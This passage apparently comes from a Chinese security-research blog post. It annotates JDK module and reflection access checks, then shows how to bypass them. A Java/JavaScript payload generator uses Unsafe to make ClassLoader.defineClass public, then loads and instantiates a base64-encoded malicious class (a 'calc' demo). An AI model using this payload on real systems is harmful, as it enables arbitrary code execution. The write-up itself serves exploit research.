<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判定调用方是否被允许为“当前反射对象”（Field/Method/Constructor）开启越权访问</span></span><br><span class="line"><span class="comment"> *（即允许后续通过该反射对象跳过语言级别的可见性检查）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;判定依据（按优先级）&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;调用者模块与声明类模块是否相同（同模块放行）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;调用者是否为 &#123;<span class="doctag">@code</span> java.base&#125;（JDK 内部可信调用方放行）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;声明类是否处于未命名模块（classpath 兼容放行）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若声明类为 public 且其包对调用者模块已 &#123;<span class="doctag">@code</span> exports&#125;：</span></span><br><span class="line"><span class="comment"> *       &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;成员为 public → 放行；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;成员为 protected 且 static，且调用者是声明类的子类 → 放行。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若包对调用者模块已 &#123;<span class="doctag">@code</span> opens&#125;（深反射）→ 放行；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;否则拒绝。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：本方法&lt;strong&gt;仅做权限检查与必要的日志&lt;/strong&gt;，不改变实际可访问标志；</span></span><br><span class="line"><span class="comment"> * 真正的开关由后续的底层调用（例如 &#123;<span class="doctag">@code</span> setAccessible0(boolean)&#125;）完成。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller                  直接调用 &#123;<span class="doctag">@code</span> setAccessible/trySetAccessible&#125; 的类（调用者）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> declaringClass          声明该成员的类（可能是父类/接口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> throwExceptionIfDenied  为 &#123;<span class="doctag">@code</span> true&#125; 时，拒绝将抛出</span></span><br><span class="line"><span class="comment"> *                                &#123;<span class="doctag">@link</span> InaccessibleObjectException&#125;；为 &#123;<span class="doctag">@code</span> false&#125; 时返回 &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>                        允许开盖则返回 &#123;<span class="doctag">@code</span> true&#125;；在 &#123;<span class="doctag">@code</span> throwExceptionIfDenied == false&#125; 且被拒绝时返回 &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InaccessibleObjectException 当被拒绝且 &#123;<span class="doctag">@code</span> throwExceptionIfDenied&#125; 为 &#123;<span class="doctag">@code</span> true&#125; 时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException      若上层安全检查（如 SecurityManager）未通过（通常在更外层触发）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt; declaringClass,</span></span><br><span class="line"><span class="params">                                      <span class="type">boolean</span> throwExceptionIfDenied)</span> &#123;</span><br><span class="line">    <span class="comment">// 取得“调用者所在模块”和“目标成员的声明类所在模块”</span></span><br><span class="line">    <span class="type">Module</span> <span class="variable">callerModule</span> <span class="operator">=</span> caller.getModule();</span><br><span class="line">    <span class="type">Module</span> <span class="variable">declaringModule</span> <span class="operator">=</span> declaringClass.getModule();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 同模块：调用者与目标在同一模块 → 放行</span></span><br><span class="line">    <span class="keyword">if</span> (callerModule == declaringModule) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) JDK 自身（java.base）作为调用者 → 放行（可信调用者，库内部需要）</span></span><br><span class="line">    <span class="keyword">if</span> (callerModule == Object.class.getModule()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 目标类在“未命名模块”（classpath） → 放行（历史兼容）</span></span><br><span class="line">    <span class="keyword">if</span> (!declaringModule.isNamed()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目标包名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pn</span> <span class="operator">=</span> declaringClass.getPackageName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取成员修饰符（Field 或 Executable(Method/Constructor)）</span></span><br><span class="line">    <span class="type">int</span> modifiers;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Executable) &#123;</span><br><span class="line">        modifiers = ((Executable) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        modifiers = ((Field) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 若声明类是 public 且其包已对 callerModule 做了 exports（编译/运行期可读）</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isClassPublic</span> <span class="operator">=</span> Modifier.isPublic(declaringClass.getModifiers());</span><br><span class="line">    <span class="keyword">if</span> (isClassPublic &amp;&amp; declaringModule.isExported(pn, callerModule)) &#123;</span><br><span class="line">        <span class="comment">// 4a) 成员是 public → 放行（无需 deep-open）</span></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">            logIfExportedForIllegalAccess(caller, declaringClass);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4b) 成员是 protected 且 static，且 caller 是声明类的子类 → 放行</span></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isProtected(modifiers)</span><br><span class="line">            &amp;&amp; Modifier.isStatic(modifiers)</span><br><span class="line">            &amp;&amp; isSubclassOf(caller, declaringClass)) &#123;</span><br><span class="line">            logIfExportedForIllegalAccess(caller, declaringClass);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 若目标包对 callerModule 做了 opens（允许深反射访问所有成员）→ 放行</span></span><br><span class="line">    <span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">        logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 其余情况：不允许。</span></span><br><span class="line">    <span class="comment">//    若要求抛异常（通常对应 setAccessible/失败要抛）→ 构造并抛出 InaccessibleObjectException；</span></span><br><span class="line">    <span class="comment">//    否则（通常对应 trySetAccessible）→ 返回 false。</span></span><br><span class="line">    <span class="keyword">if</span> (throwExceptionIfDenied) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to make &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Field) msg += <span class="string">&quot;field &quot;</span>;</span><br><span class="line">        msg += <span class="built_in">this</span> + <span class="string">&quot; accessible: &quot;</span> + declaringModule + <span class="string">&quot; does not \&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// public 类 + public 成员缺少的是 exports；否则缺少的是 opens</span></span><br><span class="line">        <span class="keyword">if</span> (isClassPublic &amp;&amp; Modifier.isPublic(modifiers))</span><br><span class="line">            msg += <span class="string">&quot;exports&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            msg += <span class="string">&quot;opens&quot;</span>;</span><br><span class="line">        msg += <span class="string">&quot; &quot;</span> + pn + <span class="string">&quot;\&quot; to &quot;</span> + callerModule;</span><br><span class="line"></span><br><span class="line">        <span class="type">InaccessibleObjectException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InaccessibleObjectException</span>(msg);</span><br><span class="line">        <span class="keyword">if</span> (printStackTraceWhenAccessFails()) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果“当前模块”的某个包已对“给定模块”至少以『打开（open）』的方式暴露，</span></span><br><span class="line"><span class="comment"> * 则返回 &#123;<span class="doctag">@code</span> true&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt; 说明：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若用于检测“包是否对自身开放”，则返回 &#123;<span class="doctag">@code</span> true&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若当前模块是 &#123;<span class="doctag">@link</span> ModuleDescriptor#isOpen open&#125; 模块，并且该包属于当前模块，</span></span><br><span class="line"><span class="comment"> *       则返回 &#123;<span class="doctag">@code</span> true&#125;（open 模块 = 模块内所有包均处于 open 状态）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若当前模块是『未命名模块』（classpath 上的默认模块），则总是返回 &#123;<span class="doctag">@code</span> true&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：本方法&lt;strong&gt;不检查&lt;/strong&gt;给定模块是否“读取（reads）”当前模块。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pn    包名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> other 另一个模块（调用方模块）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 若当前模块已将该包『打开』给至少这个模块，则返回 &#123;<span class="doctag">@code</span> true&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ModuleDescriptor#opens()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #addOpens(String, Module)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> AccessibleObject#setAccessible(boolean)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.lang.invoke.MethodHandles#privateLookupIn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isOpen</span><span class="params">(String pn, Module other)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(pn);</span><br><span class="line">    Objects.requireNonNull(other);</span><br><span class="line">    <span class="comment">// 第三个参数 open=true —— 表示按「打开(open)」的语义来判定</span></span><br><span class="line">    <span class="keyword">return</span> implIsExportedOrOpen(pn, other, <span class="comment">/*open*/</span> <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判定“当前模块”的给定包，是否对 other 模块『导出（exports）或打开（open）』。</span></span><br><span class="line"><span class="comment"> * 当 other 是一个“代表所有模块”的特殊哨兵（EVERYONE_MODULE）时，</span></span><br><span class="line"><span class="comment"> * 本方法用于判断该包是否『无条件地导出/打开』。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pn   包名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> other 另一个模块（或“所有模块”哨兵）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> open  为 true 表示按『open』语义判断；为 false 表示按『exports』语义判断</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">implIsExportedOrOpen</span><span class="params">(String pn, Module other, <span class="type">boolean</span> open)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 未命名模块（classpath）：其所有包都被视为 open（也等价视为已导出）</span></span><br><span class="line">    <span class="keyword">if</span> (!isNamed())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 对自身：模块内的任意包对“自己”总是可见</span></span><br><span class="line">    <span class="keyword">if</span> (other == <span class="built_in">this</span> &amp;&amp; descriptor.packages().contains(pn))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) open 模块或 automatic 模块：模块内所有包都视为 open</span></span><br><span class="line">    <span class="comment">//    - open module M &#123; ... &#125;  =&gt; 模块中所有包处于 open 状态</span></span><br><span class="line">    <span class="comment">//    - automatic module       =&gt; 放在 module path 上的无 module-info 的 jar，推导为命名模块；</span></span><br><span class="line">    <span class="comment">//                                其包在反射语义上也视为 open</span></span><br><span class="line">    <span class="keyword">if</span> (descriptor.isOpen() || descriptor.isAutomatic())</span><br><span class="line">        <span class="keyword">return</span> descriptor.packages().contains(pn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 静态声明的导出/打开：来自 module-info（exports / opens / opens ... to ...）</span></span><br><span class="line">    <span class="keyword">if</span> (isStaticallyExportedOrOpen(pn, other, open))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 运行期追加的导出/打开：来自 addExports / addOpens / redefineModules 等动态手段</span></span><br><span class="line">    <span class="keyword">if</span> (isReflectivelyExportedOrOpen(pn, other, open))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 均不满足：既未导出也未打开给 other</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总的来说，调用者为了能够获取被反射类的属性访问权限，必须满足以下至少一个条件：</p>
<ol>
<li><p><strong>同一模块</strong><br> <code>caller</code> 与 <code>declaringClass</code> 属于<strong>同一个模块</strong>。</p>
</li>
<li><p><strong>调用者在 <code>java.base</code> 模块</strong><br> 即 <code>caller.getModule() == Object.class.getModule()</code>（JDK 自身代码的“可信调用者”）。</p>
</li>
<li><p><strong>目标类处于未命名模块</strong><br> <code>declaringClass</code> 位于<strong>未命名模块</strong>（classpath 上的类），为历史兼容而放行。</p>
<blockquote>
<p><strong>未命名模块</strong>就是：<strong>在 classpath 上加载的代码所在的“默认模块”</strong>。只要你没用 <code>module-info.java</code>、也没走 <code>--module-path</code>，你的类就属于某个类加载器的未命名模块（<code>clazz.getModule().isNamed() == false</code>）。</p>
</blockquote>
</li>
<li><p><strong>已导出（exports）+ 公共 &#x2F; 受保护静态成员</strong><br>同时满足：</p>
<ul>
<li><code>declaringClass</code> 是 <strong>public</strong>；</li>
<li><code>declaringClass</code> 所在包 <strong>已 exports 给 caller 模块</strong>；</li>
<li>且<strong>成员</strong>满足其一：<ul>
<li>成员是 <strong>public</strong>；</li>
<li>成员是 <strong>protected 且 static</strong>，并且 <code>caller</code> <strong>是 <code>declaringClass</code> 的子类</strong>。</li>
</ul>
</li>
</ul>
<blockquote>
<p>说明：此分支对应“<strong>公开访问路径</strong>”，本就不需要“深反射”(open)。对 <strong>public</strong> 成员，<code>setAccessible(true)</code> 通常是冗余的，但检查仍会放行。</p>
</blockquote>
</li>
<li><p><strong>已开放（opens）</strong></p>
<p><code>declaringClass</code> 所在包<strong>对 caller 模块已开放</strong>（满足任意一条即可），于是可走<strong>深反射路径</strong>（<code>setAccessible(true)</code> 可放行）：</p>
<ul>
<li><strong>模块级全开放</strong>：<code>open module &lt;M&gt; &#123; ... &#125;</code>（模块内<strong>所有包</strong>对所有模块开放）。</li>
<li><strong>包级无条件开放</strong>：<code>opens &lt;pkg&gt;;</code>（该包对<strong>所有模块</strong>开放）。</li>
<li><strong>包级定向开放</strong>：<code>opens &lt;pkg&gt; to &lt;callerModule&gt;;</code>（该包只对指定模块开放）。</li>
<li><strong>自动模块（automatic module）</strong>：JAR 放在 <em>module path</em>、无 <code>module-info</code>，其<strong>所有包视为 open</strong>。</li>
<li><strong>命令行追加开放</strong>：<code>--add-opens &lt;module&gt;/&lt;pkg&gt;=&lt;callerModule&gt;</code> 或 <code>=ALL-UNNAMED</code>（给 classpath 代码开口）。</li>
<li><strong>运行时追加开放</strong>：<code>Module::addOpens(...)</code> 或 agent 的 <code>Instrumentation#redefineModules(...)</code> 动态追加。</li>
<li><strong>（仅 JDK 9–15 默认）迁移期自动开放</strong>：<code>--illegal-access=permit</code> 下，<strong>JDK8 已存在的 JDK 包</strong>（如 <code>java.base/java.lang</code>）会临时 <strong>open 给 ALL-UNNAMED</strong>；<strong>caller 在 classpath 时 <code>isOpen(...)</code> 判真并打印一次性告警。</strong><br> （JDK 16 默认改为强封装，JDK 17 移除该选项。）</li>
</ul>
<blockquote>
<p>说明：此分支对应“<strong>深反射路径</strong>”，允许越权访问非 public 成员或绕过语言级检查。</p>
</blockquote>
</li>
</ol>
<p>本判定适用于 **<code>Field</code> &#x2F; <code>Method</code> &#x2F; <code>Constructor</code>**（它们同属 <code>AccessibleObject</code>），其中：</p>
<ul>
<li><p>**<code>caller</code>**：直接调用 <code>setAccessible/trySetAccessible</code> 的类（由 <code>Reflection.getCallerClass()</code> 得到）。</p>
</li>
<li><p><strong><code>declaringClass</code><strong>：</strong>声明该成员</strong>的类（<code>getDeclaringClass()</code>），可能是父类&#x2F;接口。</p>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5) 若目标包对 callerModule 做了 opens（允许深反射访问所有成员）→ 放行</span></span><br><span class="line"><span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">    logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后一个条件（<code>isOpen</code>）能放行深反射，但<strong>只有当包已显式开放</strong>或<strong>在 JDK 9–15 的兼容模式下被临时开放</strong>时才成立。</p>
<ul>
<li>前者是<strong>合法</strong>的深反射，不会产生‘Illegal reflective access’警告；</li>
<li>后者才会触发 <code>logIfOpenedForIllegalAccess</code> 的一次性（或多次）警告。</li>
</ul>
<p>自 JDK 16&#x2F;17 起，这种兼容期的自动开放被关闭&#x2F;失效，必须使用 <code>opens</code>&#x2F;<code>--add-opens</code> 才能通过该条件。”</p>

    </div>
  </div>

<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="修改访问属性"><a href="#修改访问属性" class="headerlink" title="修改访问属性"></a>修改访问属性</h5><p>在分析出过滤条件之后，我们只需要设法满足上述条件即可绕过。通常来说我们都是通过修改被反射对象来满足 <code>checkCanSetAccessible</code> 的条件。</p>
<p>还是以  JS 引擎动态加载字节码为例，这一过程中被反射类 <code>ClassLoader</code> 的访问属性 <code>public</code>，但是 <code>defineClass</code> 方法为私有方法因此不满足条件。</p>
<p>我们可以通过反射修改 <code>defineClass</code> 方法对应 <code>Method</code> 的 <code>modifiers</code> 属性使得  <code>defineClass</code> 方法的访问修饰符为 <code>public</code> 来实现绕过。修改 <code>modifiers</code> 的过程既可以在 Java 代码中也可以在 JS 代码中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJsPayload</span><span class="params">(String code)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;var data = &#x27;&quot;</span> + code + <span class="string">&quot;&#x27;;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Unsafe = Java.type(\&quot;sun.misc.Unsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var field = Unsafe.class.getDeclaredField(\&quot;theUnsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field.setAccessible(true);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var unsafe = field.get(null);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Modifier = Java.type(\&quot;java.lang.reflect.Modifier\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var byteArray = Java.type(\&quot;byte[]\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var int = Java.type(\&quot;int\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;defineClass\&quot;,byteArray.class,int.class,int.class);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var modifiers = defineClassMethod.getClass().getDeclaredField(\&quot;modifiers\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var cc = defineClassMethod.invoke(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cc.newInstance();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">manager.getEngineByName(<span class="string">&quot;js&quot;</span>).eval(getJsPayload(Base64.getEncoder().encodeToString(getEvilClass(<span class="string">&quot;calc&quot;</span>))));</span><br></pre></td></tr></table></figure></div>

<h3 id="12≤JDK"><a href="#12≤JDK" class="headerlink" title="12≤JDK&lt;17 (getDeclaredField)"></a>12≤JDK&lt;17 (getDeclaredField)</h3><p>JDK12 起针对 <code>getDeclaredField</code> 的限制增多，一些字段对应的 <code>Field</code> 对象无法获取。</p>
<h4 id="限制条件分析-1"><a href="#限制条件分析-1" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p><code>jdk.internal.reflect.Reflection</code> 中的 <code>fieldFilterMap</code> 用于存储需要被过滤的 <code>Field</code>，所有添加到这个 Map 的字段都不能通过反射获取。</p>
<p>在 JDK11 中，这个字段仅对很少一部分类的个别字段做了限制：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反射工具类：为 &#123;<span class="doctag">@code</span> java.lang&#125; 与 &#123;<span class="doctag">@code</span> java.lang.reflect&#125; 提供若干公共的内部辅助能力。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 